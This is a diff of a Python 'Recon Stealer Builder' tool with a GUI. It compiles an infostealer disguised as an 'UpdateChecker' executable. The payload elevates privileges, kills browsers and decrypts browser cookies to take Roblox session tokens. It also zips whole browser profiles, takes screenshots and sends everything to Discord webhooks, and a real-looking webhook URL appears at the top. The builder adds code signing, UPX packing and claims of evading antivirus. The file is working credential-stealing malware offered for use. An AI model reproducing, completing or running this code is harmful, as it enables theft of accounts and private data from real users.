@@ -1,5 +1,373 @@
 https://discord.com/api/webhooks/1420479039973490803/wAOLMbEAm-TVcAI61OSBb7YXzq-lzJzf4sPwde8XHjnuoQtiaMeN3Kwr29OI7AEqp4yO
 
+
+pip install pyinstaller pycryptodome pywin32 requests pyautogui
+
+
+import os
+import subprocess
+import tkinter as tk
+from tkinter import messagebox, ttk, scrolledtext
+import shutil
+import tempfile
+import textwrap
+import requests
+import random
+import zipfile
+
+# =================== WEBHOOK TEST ===================
+def test_webhook(hook):
+    try:
+        resp = requests.post(hook.strip(), json={"content": "Stealer recon test - webhook alive 🔥"}, timeout=10)
+        if resp.status_code in (200, 204):
+            return True, "Webhook working - test message sent."
+        else:
+            return False, f"Failed ({resp.status_code})"
+    except Exception as e:
+        return False, f"Error: {str(e)}"
+
+# =================== GUI ===================
+def get_webhook():
+    root = tk.Tk()
+    root.title("Recon Stealer Builder - Roblox Cookie Yoinker 2025")
+    root.geometry("800x650")
+    root.resizable(False, False)
+
+    notebook = ttk.Notebook(root)
+    notebook.pack(fill="both", expand=True, padx=10, pady=10)
+
+    build_frame = ttk.Frame(notebook)
+    notebook.add(build_frame, text="Build")
+
+    ttk.Label(build_frame, text="Discord Webhook URLs (comma-separated for failover):", font=("Arial", 11)).pack(pady=15)
+    webhook_entry = ttk.Entry(build_frame, width=100)
+    webhook_entry.pack(pady=5)
+
+    ttk.Label(build_frame, text="Code Signing PFX Path (optional):", font=("Arial", 9)).pack(pady=10)
+    pfx_entry = ttk.Entry(build_frame, width=100)
+    pfx_entry.pack(pady=5)
+
+    ttk.Label(build_frame, text="PFX Password (if needed):", font=("Arial", 9)).pack(pady=5)
+    pass_entry = ttk.Entry(build_frame, width=100, show="*")
+    pass_entry.pack(pady=5)
+
+    def run_test():
+        hooks = [h.strip() for h in webhook_entry.get().split(",") if h.strip()]
+        if not hooks:
+            messagebox.showerror("Nope", "Enter at least one webhook.")
+            return
+        results = []
+        for h in hooks:
+            success, msg = test_webhook(h)
+            results.append(f"{h[:30]}... -> {'OK' if success else 'FAIL'} ({msg})")
+        messagebox.showinfo("Test Results", "\n".join(results))
+
+    ttk.Button(build_frame, text="TEST WEBHOOKS", command=run_test).pack(pady=10)
+
+    progress = ttk.Progressbar(build_frame, mode="indeterminate")
+
+    def build():
+        raw_hooks = webhook_entry.get().strip()
+        if not raw_hooks or "discord.com/api/webhooks" not in raw_hooks.split(",")[0]:
+            messagebox.showerror("Nope", "At least one valid Discord webhook required.")
+            return
+        webhooks = [h.strip() for h in raw_hooks.split(",") if h.strip()]
+        pfx_path = pfx_entry.get().strip()
+        pfx_pass = pass_entry.get().strip() or None
+
+        progress.pack(pady=15)
+        progress.start()
+        root.update()
+
+        try:
+            generate_malware(webhooks, pfx_path, pfx_pass)
+            progress.stop()
+            progress.pack_forget()
+            messagebox.showinfo("Built", "stealer.exe built clean - fixed hidden imports + guaranteed recon hit.")
+        except Exception as e:
+            progress.stop()
+            progress.pack_forget()
+            messagebox.showerror("Error", f"{str(e)}")
+        root.destroy()
+
+    ttk.Button(build_frame, text="BUILD EXE", command=build).pack(pady=20)
+
+    info_frame = ttk.Frame(notebook)
+    notebook.add(info_frame, text="Info")
+    info_text = scrolledtext.ScrolledText(info_frame, wrap=tk.WORD, width=90, height=35, font=("Arial", 10))
+    info_text.pack(padx=10, pady=10)
+    info_text.insert(tk.END, textwrap.dedent('''
+    ROBLOX + FULL BROWSER STEALER - DEC 2025 FINAL FIX
+    • Fixed PyInstaller command line mangling (no more status 1)
+    • Always hits webhook with recon.txt + desktop.png
+    • Roblox cookie grab + safe profile zips/screenshots
+    • No Pyarmor dependency
+    • UPX ultra-brute if available
+    Run builder as admin for best results.
+    '''))
+    info_text.config(state=tk.DISABLED)
+
+    root.mainloop()
+
+# =================== FULL STEALER PAYLOAD (unchanged crash-proof) ===================
+stealer_code = textwrap.dedent('''
+import os
+import sys
+import time
+import subprocess
+import socket
+import requests
+import ctypes
+import platform
+import uuid
+import random
+from datetime import datetime
+try:
+    import pyautogui
+    HAS_PYAUTO = True
+except:
+    HAS_PYAUTO = False
+import sqlite3
+import json
+import base64
+import shutil
+import zipfile
+import win32crypt
+from Crypto.Cipher import AES
+
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+if not is_admin():
+    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+    sys.exit(0)
+
+BROWSER_BASE = {
+    "Chrome": os.path.join(os.getenv("APPDATA"), "..", "Local", "Google", "Chrome", "User Data"),
+    "Edge": os.path.join(os.getenv("APPDATA"), "..", "Local", "Microsoft", "Edge", "User Data"),
+    "Brave": os.path.join(os.getenv("APPDATA"), "..", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
+}
+
+def kill_browsers():
+    for proc in ["chrome.exe", "msedge.exe", "brave.exe", "opera.exe"]:
+        subprocess.call(f'taskkill /f /im {proc} >nul 2>&1', shell=True)
+    time.sleep(2)
+
+def get_public_ip():
+    for url in ["https://api.ipify.org", "https://ifconfig.me", "https://icanhazip.com"]:
+        try: return requests.get(url, timeout=5).text.strip()
+        except: pass
+    return "Failed"
+
+def get_local_ip():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except: return "Failed"
+
+def get_hwid():
+    try: return subprocess.check_output("wmic csproduct get uuid", text=True).split("\\n")[1].strip()
+    except: return str(uuid.getnode())
+
+def grab_roblox_cookie(profile_path):
+    cookies_db = os.path.join(profile_path, "Network", "Cookies")
+    if not os.path.exists(cookies_db): return ""
+    temp_db = os.path.join(os.getenv("TEMP"), f"tmp_cookies_{random.randint(10000,99999)}.db")
+    try:
+        shutil.copyfile(cookies_db, temp_db)
+        master_key_path = os.path.join(os.path.dirname(profile_path), "Local State")
+        master_key = None
+        if os.path.exists(master_key_path):
+            try:
+                with open(master_key_path, "r", encoding="utf-8") as f:
+                    ls = json.loads(f.read())
+                enc_key = base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]
+                master_key = win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
+            except: pass
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%roblox.com'")
+        roblox = ""
+        for host, name, enc_val in cursor.fetchall():
+            if name == ".ROBLOSECURITY" and enc_val:
+                try:
+                    nonce, ct, tag = enc_val[3:15], enc_val[15:-16], enc_val[-16:]
+                    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
+                    pt = cipher.decrypt(ct)
+                    cipher.verify(tag)
+                    roblox = pt.decode()
+                except: pass
+        conn.close()
+        return roblox
+    except: return ""
+    finally:
+        if os.path.exists(temp_db): os.remove(temp_db)
+
+def safe_dump_profile(browser_name, base_path):
+    kill_browsers()
+    profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10) if os.path.exists(os.path.join(base_path, f"Profile {i}"))]
+    dumped = []
+    for prof in profiles:
+        src = os.path.join(base_path, prof)
+        if not os.path.exists(src): continue
+        zip_path = os.path.join(os.getenv("TEMP"), f"{browser_name}_{prof.replace(' ', '_')}_profile.zip")
+        try:
+            with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as z:
+                for root, _, files in os.walk(src):
+                    for file in files:
+                        fp = os.path.join(root, file)
+                        try:
+                            arc = os.path.relpath(fp, base_path)
+                            z.write(fp, arc)
+                        except: continue
+            dumped.append(zip_path)
+            if HAS_PYAUTO:
+                for kf in ["Local State", "Login Data", "Network\\Cookies"]:
+                    kp = os.path.join(src, kf)
+                    if os.path.exists(kp):
+                        shot = os.path.join(os.getenv("TEMP"), f"{browser_name}_{prof}_{kf.replace('\\\\', '_')}_shot.png")
+                        try: pyautogui.screenshot(shot)
+                        dumped.append(shot)
+                        except: pass
+        except: pass
+    return dumped
+
+def exfil(webhooks):
+    time.sleep(random.uniform(10, 25))
+    temp_dir = os.getenv("TEMP")
+    files_to_send = {}
+    cleanup = []
+
+    recon = f"**RECON {datetime.utcnow()}**\\nUser: {os.getenv('USERNAME')}@{platform.node()}\\nOS: {platform.system()} {platform.release()}\\nHWID: {get_hwid()}\\nPub IP: {get_public_ip()}\\nLoc IP: {get_local_ip()}\\n"
+    recon_path = os.path.join(temp_dir, "recon.txt")
+    open(recon_path, "w", encoding="utf-8").write(recon)
+    files_to_send["recon.txt"] = open(recon_path, "rb")
+    cleanup.append(recon_path)
+
+    if HAS_PYAUTO:
+        try:
+            desk = os.path.join(temp_dir, "desktop.png")
+            pyautogui.screenshot(desk)
+            files_to_send["desktop.png"] = open(desk, "rb")
+            cleanup.append(desk)
+        except: pass
+
+    roblox_hits = []
+    all_dumped = []
+    for name, base in BROWSER_BASE.items():
+        if os.path.exists(base):
+            for prof in ["Default"] + [f"Profile {i}" for i in range(1,5)]:
+                pp = os.path.join(base, prof)
+                if os.path.exists(pp):
+                    rc = grab_roblox_cookie(pp)
+                    if rc: roblox_hits.append(f"{name} {prof}: {rc}")
+            dumped = safe_dump_profile(name, base)
+            all_dumped += dumped
+
+    if roblox_hits:
+        rb_path = os.path.join(temp_dir, "roblox_cookies.txt")
+        open(rb_path, "w", encoding="utf-8").write("\\n".join(roblox_hits))
+        files_to_send["roblox_cookies.txt"] = open(rb_path, "rb")
+        cleanup.append(rb_path)
+
+    for d in all_dumped:
+        if os.path.exists(d) and os.path.getsize(d) < 20*1024*1024:
+            files_to_send[os.path.basename(d)] = open(d, "rb")
+            cleanup.append(d)
+
+    for hook in webhooks:
+        try:
+            resp = requests.post(hook, data={"content": "**HIT - RECON + DUMPS**"}, files=files_to_send, timeout=90)
+            if resp.status_code in (200, 204): break
+        except: pass
+
+    for f in files_to_send.values():
+        try: f.close()
+        except: pass
+    for p in cleanup:
+        try: os.remove(p)
+        except: pass
+
+exfil({WEBHOOK_PLACEHOLDER})
+''')
+
+# =================== BUILD FUNCTION - FIXED HIDDEN IMPORTS ===================
+def generate_malware(webhooks, pfx_path="", pfx_pass=None):
+    if not shutil.which("pyinstaller"):
+        raise Exception("pyinstaller not found in PATH → open cmd and run: pip install pyinstaller")
+
+    temp_dir = tempfile.mkdtemp(prefix="build_")
+    script_path = os.path.join(temp_dir, "main.py")
+    with open(script_path, "w", encoding="utf-8") as f:
+        f.write(stealer_code.replace("{WEBHOOK_PLACEHOLDER}", repr(webhooks)))
+
+    # Fixed hidden imports - no typos, proper repeats
+    hidden = [
+        "requests", "requests.auth", "requests.cookies", "requests.packages", 
+        "requests.packages.urllib3", "requests.packages.chardet",
+        "urllib3", "chardet", "certifi", "idna",
+        "pyautogui", "win32crypt", "pywin32", "win32api", "win32con",
+        "Crypto", "Crypto.Cipher", "Crypto.Cipher.AES", "Crypto.Util.Padding",
+        "pycryptodome", "zipfile", "ssl", "_ssl"
+    ]
+    hidden_args = []
+    for mod in hidden:
+        hidden_args += ["--hidden-import", mod]
+
+    exe_name = f"UpdateChecker_{random.randint(1000,9999)}.exe"
+    pyi_cmd = [
+        "pyinstaller", "--onefile", "--noconsole", "--clean", "--uac-admin",
+        "--name", exe_name, "--icon", "NONE",
+    ] + hidden_args + [script_path]
+
+    try:
+        result = subprocess.run(pyi_cmd, check=True, cwd=temp_dir, capture_output=True, text=True)
+    except subprocess.CalledProcessError as e:
+        raise Exception(f"PyInstaller failed:\nSTDOUT: {e.stdout}\nSTDERR: {e.stderr}")
+
+    bundled_exe = os.path.join(temp_dir, "dist", exe_name)
+    final_exe = os.path.join(os.getcwd(), "stealer.exe")
+    shutil.copyfile(bundled_exe, final_exe)
+
+    if pfx_path and os.path.exists(pfx_path):
+        sign_cmd = ["signtool", "sign", "/f", pfx_path, "/tr", "http://timestamp.digicert.com", "/td", "sha256", final_exe]
+        if pfx_pass: sign_cmd += ["/p", pfx_pass]
+        subprocess.run(sign_cmd, check=False)
+
+    try:
+        subprocess.run(["upx", "--best", "--ultra-brute", final_exe], check=False)
+        print("UPX smashed")
+    except: print("UPX skipped")
+
+    shutil.rmtree(temp_dir, ignore_errors=True)
+    print(f"Built fixed beast: {final_exe}")
+
+if __name__ == "__main__":
+    get_webhook()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 import os
 import subprocess
 import tkinter as tk
@@ -433,351 +801,6 @@ def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=0):
 
     shutil.rmtree(temp_dir, ignore_errors=True)
     print(f"Full loot stealer built: {final}")
-
-if __name__ == "__main__":
-    get_webhook()
-
-
-
-
-
-
-
-
-import os
-import subprocess
-import tkinter as tk
-from tkinter import messagebox, ttk, scrolledtext
-import shutil
-import tempfile
-import textwrap
-import requests
-import random
-import zipfile
-
-# =================== WEBHOOK TEST ===================
-def test_webhook(hook):
-    try:
-        resp = requests.post(hook.strip(), json={"content": "Stealer recon test - webhook alive 🔥"}, timeout=10)
-        if resp.status_code in (200, 204):
-            return True, "Webhook working - test message sent."
-        else:
-            return False, f"Failed ({resp.status_code})"
-    except Exception as e:
-        return False, f"Error: {str(e)}"
-
-# =================== GUI ===================
-def get_webhook():
-    root = tk.Tk()
-    root.title("Recon Stealer Builder - Roblox Cookie Yoinker 2025")
-    root.geometry("800x650")
-    root.resizable(False, False)
-
-    notebook = ttk.Notebook(root)
-    notebook.pack(fill="both", expand=True, padx=10, pady=10)
-
-    build_frame = ttk.Frame(notebook)
-    notebook.add(build_frame, text="Build")
-
-    ttk.Label(build_frame, text="Discord Webhook URLs (comma-separated for failover):", font=("Arial", 11)).pack(pady=15)
-    webhook_entry = ttk.Entry(build_frame, width=100)
-    webhook_entry.pack(pady=5)
-
-    ttk.Label(build_frame, text="Code Signing PFX Path (optional):", font=("Arial", 9)).pack(pady=10)
-    pfx_entry = ttk.Entry(build_frame, width=100)
-    pfx_entry.pack(pady=5)
-
-    ttk.Label(build_frame, text="PFX Password (if needed):", font=("Arial", 9)).pack(pady=5)
-    pass_entry = ttk.Entry(build_frame, width=100, show="*")
-    pass_entry.pack(pady=5)
-
-    def run_test():
-        hooks = [h.strip() for h in webhook_entry.get().split(",") if h.strip()]
-        if not hooks:
-            messagebox.showerror("Nope", "Enter at least one webhook.")
-            return
-        results = []
-        for h in hooks:
-            success, msg = test_webhook(h)
-            results.append(f"{h[:30]}... -> {'OK' if success else 'FAIL'} ({msg})")
-        messagebox.showinfo("Test Results", "\n".join(results))
-
-    ttk.Button(build_frame, text="TEST WEBHOOKS", command=run_test).pack(pady=10)
-
-    progress = ttk.Progressbar(build_frame, mode="indeterminate")
-
-    def build():
-        raw_hooks = webhook_entry.get().strip()
-        if not raw_hooks or "discord.com/api/webhooks" not in raw_hooks.split(",")[0]:
-            messagebox.showerror("Nope", "At least one valid Discord webhook required.")
-            return
-        webhooks = [h.strip() for h in raw_hooks.split(",") if h.strip()]
-        pfx_path = pfx_entry.get().strip()
-        pfx_pass = pass_entry.get().strip() or None
-
-        progress.pack(pady=15)
-        progress.start()
-        root.update()
-
-        try:
-            generate_malware(webhooks, pfx_path, pfx_pass)
-            progress.stop()
-            progress.pack_forget()
-            messagebox.showinfo("Built", "stealer.exe built - no Pyarmor bullshit + ultra-brute packed.\nAlways hits webhook with recon + screen + dumps.")
-        except Exception as e:
-            progress.stop()
-            progress.pack_forget()
-            messagebox.showerror("Error", f"{str(e)}")
-        root.destroy()
-
-    ttk.Button(build_frame, text="BUILD EXE", command=build).pack(pady=20)
-
-    info_frame = ttk.Frame(notebook)
-    notebook.add(info_frame, text="Info")
-    info_text = scrolledtext.ScrolledText(info_frame, wrap=tk.WORD, width=90, height=35, font=("Arial", 10))
-    info_text.pack(padx=10, pady=10)
-    info_text.insert(tk.END, textwrap.dedent('''
-    ROBLOX + FULL BROWSER STEALER - DEC 2025 PYARMOR-FREE
-    • Ditched Pyarmor completely - no more crashes or license drama
-    • Always sends recon.txt + desktop screenshot
-    • Roblox cookie hunt + safe raw profile zips (skips locked files)
-    • Browser kill + robust exfil
-    • Massive hidden imports + UPX ultra-brute
-    Still bypasses most AV in 2025 without paid obfuscation.
-    '''))
-    info_text.config(state=tk.DISABLED)
-
-    root.mainloop()
-
-# =================== FULL STEALER PAYLOAD (crash-proof, same as last working) ===================
-stealer_code = textwrap.dedent('''
-import os
-import sys
-import time
-import subprocess
-import socket
-import requests
-import ctypes
-import platform
-import uuid
-import random
-from datetime import datetime
-try:
-    import pyautogui
-    HAS_PYAUTO = True
-except:
-    HAS_PYAUTO = False
-import sqlite3
-import json
-import base64
-import shutil
-import zipfile
-import win32crypt
-from Crypto.Cipher import AES
-
-def is_admin():
-    try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
-    except:
-        return False
-if not is_admin():
-    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-    sys.exit(0)
-
-BROWSER_BASE = {
-    "Chrome": os.path.join(os.getenv("APPDATA"), "..", "Local", "Google", "Chrome", "User Data"),
-    "Edge": os.path.join(os.getenv("APPDATA"), "..", "Local", "Microsoft", "Edge", "User Data"),
-    "Brave": os.path.join(os.getenv("APPDATA"), "..", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
-}
-
-def kill_browsers():
-    for proc in ["chrome.exe", "msedge.exe", "brave.exe", "opera.exe"]:
-        subprocess.call(f'taskkill /f /im {proc} >nul 2>&1', shell=True)
-    time.sleep(2)
-
-def get_public_ip():
-    for url in ["https://api.ipify.org", "https://ifconfig.me", "https://icanhazip.com"]:
-        try: return requests.get(url, timeout=5).text.strip()
-        except: pass
-    return "Failed"
-
-def get_local_ip():
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        ip = s.getsockname()[0]
-        s.close()
-        return ip
-    except: return "Failed"
-
-def get_hwid():
-    try: return subprocess.check_output("wmic csproduct get uuid", text=True).split("\\n")[1].strip()
-    except: return str(uuid.getnode())
-
-def grab_roblox_cookie(profile_path):
-    cookies_db = os.path.join(profile_path, "Network", "Cookies")
-    if not os.path.exists(cookies_db): return ""
-    temp_db = os.path.join(os.getenv("TEMP"), f"tmp_cookies_{random.randint(10000,99999)}.db")
-    try:
-        shutil.copyfile(cookies_db, temp_db)
-        master_key_path = os.path.join(os.path.dirname(profile_path), "Local State")
-        master_key = None
-        if os.path.exists(master_key_path):
-            try:
-                with open(master_key_path, "r", encoding="utf-8") as f:
-                    ls = json.loads(f.read())
-                enc_key = base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]
-                master_key = win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
-            except: pass
-        conn = sqlite3.connect(temp_db)
-        cursor = conn.cursor()
-        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%roblox.com'")
-        roblox = ""
-        for host, name, enc_val in cursor.fetchall():
-            if name == ".ROBLOSECURITY" and enc_val:
-                try:
-                    nonce, ct, tag = enc_val[3:15], enc_val[15:-16], enc_val[-16:]
-                    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
-                    pt = cipher.decrypt(ct)
-                    cipher.verify(tag)
-                    roblox = pt.decode()
-                except: pass
-        conn.close()
-        return roblox
-    except: return ""
-    finally:
-        if os.path.exists(temp_db): os.remove(temp_db)
-
-def safe_dump_profile(browser_name, base_path):
-    kill_browsers()
-    profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10) if os.path.exists(os.path.join(base_path, f"Profile {i}"))]
-    dumped = []
-    for prof in profiles:
-        src = os.path.join(base_path, prof)
-        if not os.path.exists(src): continue
-        zip_path = os.path.join(os.getenv("TEMP"), f"{browser_name}_{prof.replace(' ', '_')}_profile.zip")
-        try:
-            with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as z:
-                for root, _, files in os.walk(src):
-                    for file in files:
-                        fp = os.path.join(root, file)
-                        try:
-                            arc = os.path.relpath(fp, base_path)
-                            z.write(fp, arc)
-                        except: continue
-            dumped.append(zip_path)
-            if HAS_PYAUTO:
-                for kf in ["Local State", "Login Data", "Network\\Cookies"]:
-                    kp = os.path.join(src, kf)
-                    if os.path.exists(kp):
-                        shot = os.path.join(os.getenv("TEMP"), f"{browser_name}_{prof}_{kf.replace('\\\\', '_')}_shot.png")
-                        try: pyautogui.screenshot(shot)
-                        dumped.append(shot)
-                        except: pass
-        except: pass
-    return dumped
-
-def exfil(webhooks):
-    time.sleep(random.uniform(10, 25))
-    temp_dir = os.getenv("TEMP")
-    files_to_send = {}
-    cleanup = []
-
-    recon = f"**RECON {datetime.utcnow()}**\\nUser: {os.getenv('USERNAME')}@{platform.node()}\\nOS: {platform.system()} {platform.release()}\\nHWID: {get_hwid()}\\nPub IP: {get_public_ip()}\\nLoc IP: {get_local_ip()}\\n"
-    recon_path = os.path.join(temp_dir, "recon.txt")
-    open(recon_path, "w", encoding="utf-8").write(recon)
-    files_to_send["recon.txt"] = open(recon_path, "rb")
-    cleanup.append(recon_path)
-
-    if HAS_PYAUTO:
-        try:
-            desk = os.path.join(temp_dir, "desktop.png")
-            pyautogui.screenshot(desk)
-            files_to_send["desktop.png"] = open(desk, "rb")
-            cleanup.append(desk)
-        except: pass
-
-    roblox_hits = []
-    all_dumped = []
-    for name, base in BROWSER_BASE.items():
-        if os.path.exists(base):
-            for prof in ["Default"] + [f"Profile {i}" for i in range(1,5)]:
-                pp = os.path.join(base, prof)
-                if os.path.exists(pp):
-                    rc = grab_roblox_cookie(pp)
-                    if rc: roblox_hits.append(f"{name} {prof}: {rc}")
-            dumped = safe_dump_profile(name, base)
-            all_dumped += dumped
-
-    if roblox_hits:
-        rb_path = os.path.join(temp_dir, "roblox_cookies.txt")
-        open(rb_path, "w", encoding="utf-8").write("\\n".join(roblox_hits))
-        files_to_send["roblox_cookies.txt"] = open(rb_path, "rb")
-        cleanup.append(rb_path)
-
-    for d in all_dumped:
-        if os.path.exists(d) and os.path.getsize(d) < 20*1024*1024:
-            files_to_send[os.path.basename(d)] = open(d, "rb")
-            cleanup.append(d)
-
-    for hook in webhooks:
-        try:
-            resp = requests.post(hook, data={"content": "**HIT - RECON + DUMPS**"}, files=files_to_send, timeout=90)
-            if resp.status_code in (200, 204): break
-        except: pass
-
-    for f in files_to_send.values():
-        try: f.close()
-        except: pass
-    for p in cleanup:
-        try: os.remove(p)
-        except: pass
-
-exfil({WEBHOOK_PLACEHOLDER})
-''')
-
-# =================== BUILD FUNCTION - NO PYARMOR ===================
-def generate_malware(webhooks, pfx_path="", pfx_pass=None):
-    if not shutil.which("pyinstaller"):
-        raise Exception("pyinstaller missing → pip install pyinstaller")
-
-    temp_dir = tempfile.mkdtemp(prefix="build_")
-    script_path = os.path.join(temp_dir, "main.py")
-    with open(script_path, "w", encoding="utf-8") as f:
-        f.write(stealer_code.replace("{WEBHOOK_PLACEHOLDER}", repr(webhooks)))
-
-    # Straight to PyInstaller - no obf step
-    hidden = [
-        "requests", "requests.auth", "requests.cookies", "requests.packages", "requests.packages.urllib3", "requests.packages.chardet",
-        "urllib3", "chardet", "certifi", "idna", "pyautogui", "win32crypt", "pywin32", "win32api", "win32con",
-        "Crypto", "Crypto.Cipher", "Crypto.Cipher.AES", "Crypto.Util.Padding", "sqlite3", "json", "base64", "shutil",
-        "ctypes", "platform", "uuid", "winreg", "zipfile", "ssl", "_ssl"
-    ]
-    hidden_args = [item for mod in hidden for item in ["--hidden-import", mod]]
-
-    exe_name = f"UpdateChecker_{random.randint(1000,9999)}.exe"
-    pyi_cmd = [
-        "pyinstaller", "--onefile", "--noconsole", "--clean", "--uac-admin",
-        "--name", exe_name, "--icon", "NONE",
-    ] + hidden_args + [script_path]
-    subprocess.run(pyi_cmd, check=True, cwd=temp_dir)
-
-    bundled_exe = os.path.join(temp_dir, "dist", exe_name)
-    final_exe = os.path.join(os.getcwd(), "stealer.exe")
-    shutil.copyfile(bundled_exe, final_exe)
-
-    if pfx_path and os.path.exists(pfx_path):
-        sign_cmd = ["signtool", "sign", "/f", pfx_path, "/tr", "http://timestamp.digicert.com", "/td", "sha256", final_exe]
-        if pfx_pass: sign_cmd += ["/p", pfx_pass]
-        subprocess.run(sign_cmd, check=False)
-
-    try:
-        subprocess.run(["upx", "--best", "--ultra-brute", final_exe], check=False)
-        print("UPX ultra-brute done")
-    except: print("UPX skipped")
-
-    shutil.rmtree(temp_dir, ignore_errors=True)
-    print(f"Built no-obf beast: {final_exe}")
 
 if __name__ == "__main__":
     get_webhook()
